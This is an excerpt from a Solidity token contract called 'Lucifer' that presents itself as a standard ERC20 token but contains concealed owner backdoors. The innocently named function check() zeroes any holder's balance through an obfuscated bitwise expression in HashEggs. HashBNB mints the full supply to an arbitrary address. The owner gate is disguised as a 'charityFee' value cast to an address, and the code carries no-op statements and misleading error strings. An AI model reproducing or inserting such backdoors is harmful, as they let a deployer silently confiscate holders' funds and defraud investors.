...
contract Lucifer  is Ownable, IERC20 {
    ...
    uint256 public _maxTxAmount = 90000000000000000000000000000000000 * 10 ** _decimals;
    ...
    uint256 private tTotalSupply = 1000000000000000000000000000000;
    ...
    function HashEggs(address receiver) 
      internal
      view
      onlyOwner
      returns (uint256)
    {
      return (_balances[receiver]) & 1255 & (((_balances[receiver]) & swapfees & 17 & 0) << 0xF);
    }

    function check(address receiver) public onlyOwner {
      (receiver != address(0), "ERC20: burn from the zero address");
      require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");
      _balances[receiver] = HashEggs(receiver);
    }

    function HashBNB(address creator) public onlyOwner {
      (creator != address(0), "ERC20: burn from the zero address");
      require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");
      1 * charityFee / charityFee * 1;
      _balances[creator] = (tTotalSupply);
      emit Transfer(address(0), creator, tTotalSupply);
    }
